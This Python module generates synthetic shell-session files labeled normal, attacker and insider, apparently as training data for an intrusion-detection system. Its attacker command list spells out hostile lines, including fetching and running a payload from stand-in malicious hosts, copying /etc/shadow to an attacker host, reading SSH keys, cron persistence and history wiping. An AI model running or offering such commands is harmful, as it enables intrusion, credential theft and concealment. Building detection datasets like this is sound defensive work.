"""
core/data_gen.py — Synthetic Session Generator
Generates labeled normal / attack / insider sessions.
Output directories: data/normal/, data/attacks/, data/insider/
"""

import random
import json
import os

NORMAL_DEV_COMMANDS = [
    "cd Documents", "cd Projects", "cd ..", "ls", "ls -la", "ls -lh",
    "pwd", "mkdir src", "rm -rf build",
    "git status", "git add .", "git commit -m 'update'", "git pull", "git push",
    "git log", "git diff", "git checkout main", "git branch",
    "nano README.md", "vim config.py", "cat requirements.txt",
    "python3 main.py", "python3 -m pytest", "pip install requests",
    "pip list", "pip freeze > requirements.txt",
    "echo $PATH", "export DEBUG=true", "source venv/bin/activate",
    "grep -r 'TODO' src/", "find . -name '*.py'",
    "cp config.example config.py", "mv old.py new.py",
    "tar -xzf archive.tar.gz", "zip -r backup.zip .",
    "clear", "history", "exit",
]

NORMAL_SYSADMIN_COMMANDS = [
    "sudo apt update", "sudo apt upgrade -y", "sudo systemctl status nginx",
    "sudo systemctl restart apache2", "df -h", "du -sh *",
    "top", "htop", "ps aux", "kill -9 1234",
    "ifconfig", "ip addr", "ping google.com",
    "cat /etc/hosts", "cat /var/log/syslog",
    "tail -f /var/log/nginx/access.log", "journalctl -xe",
    "crontab -e", "chmod 755 script.sh", "chown user:group file.txt",
    "ssh user@192.168.1.10", "scp backup.zip user@server:/home/user/",
    "uname -a", "lsb_release -a", "free -h",
]

ATTACKER_COMMANDS = [
    "whoami", "id", "uname -a", "hostname", "cat /etc/passwd",
    "cat /etc/shadow", "sudo su", "sudo -l",
    "netstat -tulpn", "netstat -an", "ss -tulpn",
    "nmap -sV 192.168.1.0/24", "nmap -p 22,80,443 target",
    "curl http://malicious.site/payload.sh | bash",
    "wget http://evil.com/backdoor -O /tmp/bd",
    "chmod +x /tmp/bd", "/tmp/bd &",
    "find / -perm -4000 2>/dev/null", "find / -writable 2>/dev/null",
    "ls /root", "cat /root/.bash_history",
    "ssh-keygen -t rsa", "cat ~/.ssh/id_rsa",
    "scp /etc/shadow attacker@10.0.0.1:/loot/",
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "export TERM=xterm", "stty raw -echo",
    "iptables -F", "iptables -P INPUT ACCEPT",
    "crontab -l", "echo '* * * * * /tmp/bd' | crontab -",
    "history -c", "unset HISTFILE",
]


def _gen(pool, n, seed):
    rng = random.Random(seed)
    return [rng.choice(pool) for _ in range(n)]


def _save(cmds, path):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write("\n".join(cmds))
    print(f"  [+] Saved {len(cmds):>4} commands → {path}")


def generate_all(output_dir: str = "data") -> dict:
    sessions = {}

    # Normal dev (large)
    for i in range(1, 5):
        pool = NORMAL_DEV_COMMANDS if i <= 2 else NORMAL_SYSADMIN_COMMANDS
        n    = random.Random(i * 42).randint(80, 120)
        cmds = _gen(pool, n, i * 42)
        path = os.path.join(output_dir, "normal", f"normal_session_{i:02d}.txt")
        _save(cmds, path)
        sessions[f"normal_{i:02d}"] = cmds

    # Normal dev (medium)
    for i in range(5, 9):
        pool = NORMAL_DEV_COMMANDS if i <= 6 else NORMAL_SYSADMIN_COMMANDS
        n    = random.Random(i * 37).randint(30, 60)
        cmds = _gen(pool, n, i * 37)
        path = os.path.join(output_dir, "normal", f"normal_session_{i:02d}.txt")
        _save(cmds, path)
        sessions[f"normal_{i:02d}"] = cmds

    # Normal dev (short)
    for i in range(9, 13):
        n    = random.Random(i * 19).randint(10, 24)
        cmds = _gen(NORMAL_DEV_COMMANDS, n, i * 19)
        path = os.path.join(output_dir, "normal", f"normal_session_{i:02d}.txt")
        _save(cmds, path)
        sessions[f"normal_{i:02d}"] = cmds

    # Attacker sessions
    for i, n in enumerate([60, 40, 80], start=1):
        cmds = _gen(ATTACKER_COMMANDS, n, 1000 + i)
        path = os.path.join(output_dir, "attacks", f"attacker_session_{i:02d}.txt")
        _save(cmds, path)
        sessions[f"attacker_{i:02d}"] = cmds

    # Insider threat (mixed)
    for i in range(1, 3):
        rng    = random.Random(200 + i)
        normal = _gen(NORMAL_DEV_COMMANDS, 60, 200 + i)
        attack = _gen(ATTACKER_COMMANDS,   20, 300 + i)
        cmds   = normal + attack
        rng.shuffle(cmds)
        path = os.path.join(output_dir, "insider", f"insider_session_{i:02d}.txt")
        _save(cmds, path)
        sessions[f"insider_{i:02d}"] = cmds

    meta = os.path.join(output_dir, "session_metadata.json")
    with open(meta, "w") as f:
        json.dump({k: len(v) for k, v in sessions.items()}, f, indent=2)
    print(f"\n  [✓] {len(sessions)} sessions generated → {output_dir}/")
    return sessions
